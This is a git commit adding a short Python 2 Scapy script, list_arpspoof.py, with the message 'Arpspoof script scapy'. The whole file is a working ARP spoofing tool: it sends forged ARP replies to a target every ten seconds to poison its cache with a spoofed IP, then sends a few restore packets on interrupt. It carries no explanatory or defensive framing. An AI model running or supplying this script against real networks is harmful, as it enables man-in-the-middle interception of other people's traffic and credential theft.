b3ee5f72f965d6674f53d4c9b3d74ff93005c17a
root <root@localhost.localdomain>
2020-02-01 17:05:35 +0000

    Arpspoof script scapy

---
+++ list_arpspoof.py
@@ -0,0 +1,48 @@
+#!/usr/bin/python
+
+import sys
+import time
+from scapy.all import sniff, sendp, ARP, Ether
+import atexit
+import os
+
+def main():
+	if len(sys.argv) < 3:
+    		print sys.argv[0] + " <target> <spoof_ip>"
+    		sys.exit(0)
+
+	iface = "eth0"
+	target_ip = sys.argv[1]
+	fake_ip = sys.argv[2]
+
+	ethernet = Ether()
+	arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
+	packet = ethernet / arp
+
+	while True:
+    		sendp(packet, iface=iface)
+    		time.sleep(10)
+
+
+
+try:
+	main()
+except KeyboardInterrupt:
+	print ('Cleaning up......')
+	iface = "eth0"
+	target_ip = sys.argv[1]
+	fake_ip = sys.argv[2]
+
+	ethernet = Ether()
+	arp = ARP(pdst=fake_ip, psrc=target_ip, op="is-at")
+	packet = ethernet / arp
+
+	for x in range(3):
+    		sendp(packet, iface=iface)
+    		time.sleep(10)
+	try:
+		sys.exit(0)
+	except SystemExit:
+		raise SystemExit
+
+
